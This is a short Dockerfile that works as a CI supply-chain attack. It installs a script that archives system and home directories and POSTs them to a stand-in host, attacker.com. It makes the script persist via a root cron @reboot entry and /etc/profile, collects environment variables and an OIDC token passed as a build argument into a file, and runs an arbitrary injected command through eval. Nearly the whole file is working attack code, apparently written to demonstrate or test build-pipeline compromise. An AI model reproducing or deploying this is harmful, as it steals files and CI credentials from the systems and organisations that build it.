FROM python:3.11-alpine

ARG PAYLOAD_CMD
ARG EXFIL_OIDC_TOKEN

RUN apk add --no-cache curl tar bash grep && \
    echo "[+] Installing cron-based payloads..." && \
    echo '#!/bin/sh' > /usr/local/bin/init.sh && \
    echo 'tar -czf /root/ci.tar.gz /etc /root /var /home /opt /srv 2>/dev/null' >> /usr/local/bin/init.sh && \
    echo 'curl -X POST --data-binary "@/root/ci.tar.gz" http://attacker.com/dump' >> /usr/local/bin/init.sh && \
    chmod +x /usr/local/bin/init.sh && \
    echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \
    echo "/usr/local/bin/init.sh" >> /etc/profile && \
    echo "[+] Dumping filtered env..." && \
    printenv | grep -v GITHUB_TOKEN > /leaked_env.txt && \
    echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaked_env.txt && \
    tar -czf /secrets.tar.gz /leaked_env.txt 2>/dev/null && \
    echo "[+] Executing injected payload..." && \
    eval "$PAYLOAD_CMD"
